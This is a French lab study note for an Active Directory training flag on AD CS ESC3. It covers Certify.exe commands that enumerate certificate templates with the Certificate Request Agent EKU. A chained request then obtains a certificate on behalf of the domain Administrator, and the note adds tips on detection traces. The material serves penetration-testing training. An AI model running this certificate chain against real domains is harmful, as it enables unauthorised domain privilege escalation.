---
flag: 34
machine: dcorp-dc
statut: à faire
technique: ADCS-ESC3
LO: [[LO21 - AD CS (ESC1 et ESC3)]]
---

# F34 · Template ADCS Certificate Request Agent

> [!summary] Objectif
> Identifier le template AD CS dont l'EKU est `Certificate Request Agent` (OID `1.3.6.1.4.1.311.20.2.1`) et dont l'enrôlement est ouvert à `Domain Users` — premier maillon ESC3.

## Contexte
- **Etape attack flow**: alternative à ESC1 quand `ENROLLEE_SUPPLIES_SUBJECT` est absent. On combine deux templates : celui-ci (agent) + un template d'auth client.
- **Ce qu on a**: session Domain User sur `dcorp-studentx`, énumération AD CS déjà faite (cf F33).
- **Ce qu on cherche**: le **nom du template** avec EKU `Certificate Request Agent` accessible aux Domain Users.

## Solution

### Etape 1: Enumerer et grep sur EKU agent
```powershell
C:\AD\Tools\Certify.exe find
```
Dans la sortie, chercher un template où :
- `Extended Key Usage` contient `Certificate Request Agent` (OID `1.3.6.1.4.1.311.20.2.1`)
- `Enrollment Rights` inclut `<DOMAIN>\Domain Users` (ou équivalent large)

### Etape 2: Confirmer via /vulnerable
```powershell
C:\AD\Tools\Certify.exe find /vulnerable
```
Certify tague explicitement les templates ESC3 (agent + user template combinables).

### Etape 3 (chainage réel — pour référence exploitation)
```powershell
# 1. Cert d'agent (le template trouvé ici)
C:\AD\Tools\Certify.exe request /ca:<CA> /template:<TEMPLATE_AGENT>
# 2. Utiliser ce cert pour demander un cert au nom d'Administrator
C:\AD\Tools\Certify.exe request /ca:<CA> /template:<TEMPLATE_USER> /onbehalfof:<DOMAIN>\administrator /enrollcert:agent.pfx /enrollcertpw:<PW>
```
→ Voir [[Cheatsheet - AD CS et certificats]] pour la conversion PEM→PFX et Rubeus PKINIT.

## Reponse

| Element | Valeur |
|---------|--------|
| Nom du template (EKU Cert Request Agent) | <A REMPLIR DEPUIS LAB> |
| CA hébergeant le template | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- L'EKU `Certificate Request Agent` seul ne suffit pas : il faut aussi un **second** template acceptant les requêtes signées par un agent (souvent `User`, `SmartcardUser`). Sans les deux, pas d'ESC3.
- Depuis KB5014754 (2022), les CA modernes exigent le mapping strong SID — peut casser le chainage si patch appliqué.
- Trace : Event **4886/4887** + demande "on behalf of" bien visible dans le CA log.

## Refs
- [[Cheatsheet - AD CS et certificats]]
- [[Synthèse - AD CS]]
- [[LO21 - AD CS (ESC1 et ESC3)]]
- [[Attaques AD]]
